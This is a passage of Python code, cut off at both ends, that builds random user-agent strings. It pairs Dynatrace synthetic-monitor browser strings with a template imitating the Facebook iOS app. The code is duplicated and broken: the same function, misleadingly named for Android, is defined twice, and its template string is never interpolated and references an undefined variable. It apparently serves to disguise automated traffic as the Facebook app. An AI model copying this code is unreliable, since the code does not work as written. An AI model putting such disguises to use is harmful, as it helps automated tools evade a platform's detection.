(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4864976290123726892 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2412102698395490051 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4907426667461427709 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v235549919684546892 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740698262 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9053897891950126163 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8245272578888746447 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216417561 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v8281575909895522274 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0",])+END
	return ua




def iAmAndroidUa():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5032429267305577923 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v3080743920295033683 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740460569 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5810315787329864058 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2971671444439586146 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215402928 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v945805362826284339 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7516498667636054492 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v404197172359898842 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v331255244749692720 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v1141479385100107535 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v113469690414676367 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215471138 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6166280012437190145 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740484474 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v4297591102078986176 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2171903868175093894 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1754169930219420181 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6333720976224824521 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215573168 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1206684614213914794 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740508464 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v491392697765060729 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8738602164737142063 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5055390139397942904 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v6176284400327901126 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215641384 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v2899582870370254836 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v7519045008947178443 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2582832712595577758 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740532275 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4583430091197143955 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4980602542149474897 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1639227970253347342 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6061561874529354873 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9197751172116712472 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v10011283759272695 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215740016 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215745647 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6980889766868544957 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5052095287112273803 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4767794136023886487 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740555517 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6450520027995672485 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215808244 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v1872267430685357202 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2845320710860705320 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3718801101819303150 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4188194823470371169 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740579414 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5869734742608989507 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9084041351379867160 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215910264 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4639199508410487282 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8681987220671355927 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4351397214977316835 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v37003402930565689 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3525134327834240278 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v5571404649910827233 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215978473 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8356872843420553543 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740603319 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v5043633743419663969 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7994796855276585536 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6030128622839186006 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7875292909063374579 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216080501 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v117949514735453019 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740627228 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8193078289109210550 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6674022040617389791 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v1930726795496505614 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825316463071835855 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216148705 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v6177520797700783033 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1167237561826244614 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740651128 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6548651494991813410 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1635317657169688114 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v799284131744665025 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4638746326389231947 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7009351797327972341 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2373076866650673365 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7605812789465101837 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216247350 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5376638030390363943 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9141737963419875314 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1377525953552160267 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740674362 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4123109437764068959 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216315572 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4864976290123726892 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2412102698395490051 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v4907426667461427709 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v235549919684546892 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740698262 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9053897891950126163 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8245272578888746447 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216417561 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v8281575909895522274 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0",])+END
	return ua


def iAmAndroidUa():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5032429267305577923 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v3080743920295033683 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740460569 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5810315787329864058 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2971671444439586146 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215402928 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v945805362826284339 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 